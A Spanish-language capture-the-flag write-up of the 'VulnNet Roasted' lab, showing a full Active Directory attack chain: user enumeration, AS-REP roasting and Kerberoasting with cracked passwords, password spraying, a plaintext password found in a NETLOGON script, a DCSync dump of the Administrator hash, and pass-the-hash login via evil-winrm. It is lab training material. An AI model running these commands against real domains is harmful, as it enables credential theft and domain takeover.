---
tags:
title: VulnNet Roasted - Easy (HTB)
permalink: /VulnNet-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.66.128.187 -Pn
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 01:03 -0400
Initiating Parallel DNS resolution of 1 host. at 01:03
Completed Parallel DNS resolution of 1 host. at 01:03, 0.50s elapsed
Initiating SYN Stealth Scan at 01:03
Scanning 10.66.128.187 [65535 ports]
Discovered open port 139/tcp on 10.66.128.187
Discovered open port 53/tcp on 10.66.128.187
Discovered open port 135/tcp on 10.66.128.187
Discovered open port 445/tcp on 10.66.128.187
Discovered open port 593/tcp on 10.66.128.187
Discovered open port 464/tcp on 10.66.128.187
Discovered open port 49668/tcp on 10.66.128.187
Discovered open port 5985/tcp on 10.66.128.187
Discovered open port 3268/tcp on 10.66.128.187
Discovered open port 49704/tcp on 10.66.128.187
Discovered open port 49667/tcp on 10.66.128.187
Discovered open port 636/tcp on 10.66.128.187
Discovered open port 49670/tcp on 10.66.128.187
Discovered open port 49699/tcp on 10.66.128.187
Discovered open port 3269/tcp on 10.66.128.187
Discovered open port 389/tcp on 10.66.128.187
Discovered open port 88/tcp on 10.66.128.187
Discovered open port 49669/tcp on 10.66.128.187
Discovered open port 9389/tcp on 10.66.128.187
Completed SYN Stealth Scan at 01:03, 27.95s elapsed (65535 total ports)
Nmap scan report for 10.66.128.187
Host is up, received user-set (0.55s latency).
Scanned at 2026-03-14 01:03:05 EDT for 28s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
5985/tcp  open  wsman            syn-ack ttl 126
9389/tcp  open  adws             syn-ack ttl 126
49667/tcp open  unknown          syn-ack ttl 126
49668/tcp open  unknown          syn-ack ttl 126
49669/tcp open  unknown          syn-ack ttl 126
49670/tcp open  unknown          syn-ack ttl 126
49699/tcp open  unknown          syn-ack ttl 126
49704/tcp open  unknown          syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.56 seconds
           Raw packets sent: 262107 (11.533MB) | Rcvd: 51 (3.092KB)
-e [*] IP: 10.66.128.187
[*] Puertos abiertos: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49668,49669,49670,49699,49704
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49668,49669,49670,49699,49704 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 01:03 -0400
Nmap scan report for 10.66.128.187
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-14 05:03:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: -10s
| smb2-time:
|   date: 2026-03-14T05:04:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.46 seconds
```
### Enum users

Use el propio modulo de `nxc` para enumerar usuarios, basándome en el `RID`.

```bash
zs1n@ptw ~> nxc smb 10.66.128.187 -u guest -p '' --rid-brute
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest:
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```
## Shell as enterprise-core-vn

Coloque cada nombre en un archivo con el siguiente comando.

```bash
zs1n@ptw ~> cat users| grep "SidTypeUser" | awk '{print$6}' | tr '\\' ' ' | awk '{print $2}' | sponge users
```
### AS-REP Roasting

Luego con `GetNPUsers` de impacket, realice un `AS-REP Roast attack` para poder obtener hashes de usuarios validos.

```bash
zs1n@ptw ~> impacket-GetNPUsers vulnnet-rst.local/guest -no-pass -usersfile users
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:43ec9ab66c6e34fb5b3dc9c12c0a1629$2c83bedacfb0b20251a6cb7757821900cd5d95687627df88adcbdbd6ec4ac8a47335c7d079293064d227b91137de6c166f911ba2d841abdfcfa7f2cb8f25c30f49640fa166437485730ba832881323a3294db1043977a6b4ad5c032fe8ba3cf0c9116cb260c64b1c2a5409d616ad171ab2177bd4b603de6cf7d8ada91316914af9a40bb04f24862075344f665cea16f6041674a3b3fd71283ad343b54fd639b2f905c870dc0b38e2dc38869d7c4d187efde95a2dac335acdf422ab2966c0782caafea9c18200d43d0e5c4f3b8ebcb95daad4e3fd30e770343c8a4436d79e19337499e5aa631880156115dcd02c814a991ab177f2beab
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```
### Crack password

Rompí la contraseña con `john`.

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:01 DONE (2026-03-14 01:15) 0.5649g/s 1795Kp/s 1795Kc/s 1795KC/s tjgurule2..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Kerberoasting

Luego use GetUserSPNs para realizar un `Kerberoasting attack` contra la misma lista de usuarios, pero esta vez usando las credenciales del usuario `t-skid`.

```bash
zs1n@ptw ~> impacket-GetUserSPNs vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.66.128.187 -usersfile users
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
..snip..
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$enterprise-core-vn*$d84c8b2fffd320d2ee22a4723d164332$d7b31cbbc79b87ca6855040a5ccc96fa9ec47f096758d341810cafd8319555ada60d8c2eead127cab96beda6da30768e9432ba13ea863ba7686b9b9e59d58dc8b542d7c3772111137a84c9e0c3776335b2c1d38abbc838fde4dc7a1840d7fb1c9ed21c9a610762a085b337d2ae88b44464cc0ae02427d2557bf36bc77fd200971888edef4621a3c3a64b03bc0786ed2cdf83f2cde3082ac802cfb03f2d78957b364aec299334568b60ab24bb801320d678fb3a06835ca2593bca9dfafc2d6f06881a01483c2d4f4e729bf21c4553591678f482e06e5974b74c9af6b13495849b59b215000013c41a58870be8a6bb0f2a82cd43c098b6d72824b2e356c9976f61b9d266affe2cfea8f480292b08037e9bd565eb03e2f0195ee1c54bbd2a0b2c04a56201134bbb4fc8993e078c837f25ad44dc6dcb2293c5310dab752dfb16650fe18d9a5dc4ece4558ae6908c1379f958aa5c343aa9775a7d8b318621c8548129442d10cc4490d0ff2bf987bc88932fa0349ab35090310598400fe8d3db8656aa5cf8637f7c8c09caccdbd988c82fce5a1535c3fd96474731b402d141eb7542046bb7eedf9d23fd8c32447415a07225d988f5f670d7cbc4d0f9f06a9c41293a7a13f38fc57605f38f070083c46ee3a88171adcb9f056dfd4d705cc8d10c6bd13195fc0de674c70bd295969e9eced36314bc8b3e2ae775b895876af875378cda8715f363c6421353376e33eb5c54ea3d4a4a53fbfdaedd847c4579c315ee0bb4933c15f044480f9ee9af0b94aff090661d353ddab71da36515c8f6b96cb45d85bfa37e52585ab4694bc71df70dc79ae1ef18a61285d3cb5ef35b7bea068158a44425053d1910a4a153d1367ba76ca113ff40d7cecaa89176a4b016b2b3dff7937608408179a17b5101e1ed70d1114092644789056c319caa4d5b1573e8dcf22aab7742653e0a67d214f0399b8c581f8aa0dd81a719b7fec23c8197c7f18a83f87f61900ad7051893f9e37bb4e945af6ab86df56fad8afdf5a586309e21f6a50f7070a333f3fa721806de03a01dea88a66a28796c9e938ca1fd96b199aa7957c911b78c35d8a872fcd7f93faabf71cef279b9ec3c33fea2e8266e855598389920da8423f0d97bf6b7af3ca860d56664a528078474b8f7535c465e063f09d9cb280aced9255d251df07f655e95a61f7c65c30cd41613053e522e42c343a10ca4f31afa26b337af2d3c46a2a9d5dc701d5af07b9b025c68d19c31eb05de360017a7cafbf80eb24cab1ead52c77b731d63b811c49c5d24a881cf56d0a49fd039eddd59a74ee1b81ea9e03c5b4422201200601171f032dda989e6b54a53514f07074bcdc19cd890285f404a6e8fad14e496c0a8a61cc87a50914e60985d5903f4
[-] Principal: a-whitehat - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: t-skid - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: j-goldenhand - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: j-leet - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

Volví a romper el mismo con `john` nuevamente.

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)
1g 0:00:00:01 DONE (2026-03-14 01:18) 0.6756g/s 2775Kp/s 2775Kc/s 2775KC/s ryan2lauren..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Password spray

Y valide la contrasena contra la lista que obtuve, dandome una coincidencia con el usuario `enterprise-core-vn`.

```bash
zs1n@ptw ~> nxc smb 10.66.128.187 -u users -p 'ry=ibfkfv,s6h,'
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\Administrator:ry=ibfkfv,s6h, STATUS_LOGON_FAILURE
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\Guest:ry=ibfkfv,s6h, STATUS_LOGON_FAILURE
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\krbtgt:ry=ibfkfv,s6h, STATUS_LOGON_FAILURE
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\WIN-2BO8M1OE1M1$:ry=ibfkfv,s6h, STATUS_LOGON_FAILURE
SMB         10.66.128.187   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h,
```
### Collect data

Use las credenciales del mismo para recolectar los datos para `bloodhound`.

```bash
zs1n@ptw ~> rusthound-ce -d vulnnet-rst.local -f WIN-2BO8M1OE1M1.vulnnet-rst.local -i 10.66.128.187 -u enterprise-core-vn -p 'ry=ibfkfv,s6h,' -z -c All
---------------------------------------------------
Initializing RustHound-CE at 01:26:19 on 03/14/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-14T05:26:19Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-14T05:26:19Z INFO  rusthound_ce] Collection method: All
[2026-03-14T05:26:20Z INFO  rusthound_ce::ldap] Connected to VULNNET-RST.LOCAL Active Directory!
[2026-03-14T05:26:20Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-14T05:26:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-14T05:26:23Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=vulnnet-rst,DC=local
..snip..

RustHound-CE Enumeration Completed at 01:26:33 on 03/14/26! Happy Graphing!
```
### Shell

Sin encontrar nada, me conecte por `WinRM`.

```powershell
zs1n@ptw ~> evil-winrm -i vulnnet-rst.local -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> type ../desktop/user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```
## Auth as a-whitehat 
### Password leakage

Use las credenciales para conectarme por `smb`, viendo así un archivo `.vbs`

```powershell
zs1n@ptw ~> impacket-smbclient vulnnet-rst.local/enterprise-core-vn:'ry=ibfkfv,s6h,'@WIN-2BO8M1OE1M1.vulnnet-rst.local -dc-ip 10.66.128.187
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use netlogon
# ls
drw-rw-rw-          0  Tue Mar 16 19:15:49 2021 .
drw-rw-rw-          0  Tue Mar 16 19:15:49 2021 ..
-rw-rw-rw-       2821  Tue Mar 16 19:18:14 2021 ResetPassword.vbs
# get ResetPassword.vbs
```
## Shell as administrator
Viendo que en el contenido del mismo se almacenaban en texto plano las credenciales del usuario `a-whitehat`.

```javascript
zs1n@ptw ~> cat ResetPassword.vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
..snip..                     
```
### DCSync

Como este usuario posee `GenericAll` contra el DC, dumpee los hashes con `secretsdump`.

```bash
zs1n@ptw ~> impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@WIN-2BO8M1OE1M1.vulnnet-rst.local -just-dc-user administrator
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
[*] Cleaning up...
```
### Shell

Y usando el hash del usuario `administrator` me conecte.

```powershell
zs1n@ptw ~> evil-winrm -i vulnnet-rst.local -u administrator -H 'c2597747aa5e43022a3a3049a3c3b09d'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
```

`~Happy Hacking.`